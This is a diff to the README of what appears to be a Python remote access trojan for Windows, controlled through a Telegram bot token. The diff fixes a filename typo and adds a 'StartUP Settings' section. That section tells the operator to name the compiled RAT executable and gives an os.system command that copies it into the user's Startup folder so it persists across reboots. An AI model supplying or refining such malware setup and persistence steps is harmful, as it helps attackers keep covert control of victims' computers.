@@ -12,14 +12,24 @@
 -------------------------------
 # Set Bot API-Token
 
-To replace your robot Token in RAT, simply go to Line 35 in the **wWindows-Python-RAT.py** file and place your API-TOKEN instead of `TOKEN`.
+To replace your robot Token in RAT, simply go to Line 35 in the **Windows-Python-RAT.py** file and place your API-TOKEN instead of `TOKEN`.
 
 In Line 35:
 ```python
 #Replace Your Bot API-TOKEN
 update = Updater("TOKEN")
 ```
+-------------------------------
+# StartUP Settings
 
+For startup settings, you must first write the name of your bot before compiling it in the **Windows-Python-RAT.py** file. For example, before compiling the RAT file, you need to go to line 291 and name it as an `YOUR-COMPILED-RAT-NAME.exe`.
+
+In Line 291:
+```python
+os.system('copy YOUR-COMPILED-RAT-NAME.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
+#replace your rat name on 'YOUR-COMPILED-RAT-NAME.exe'
+```
+Video Tutorial Setting Up a Startup on a RAT: [Watch]()
 -------------------------------
 Logo:
 
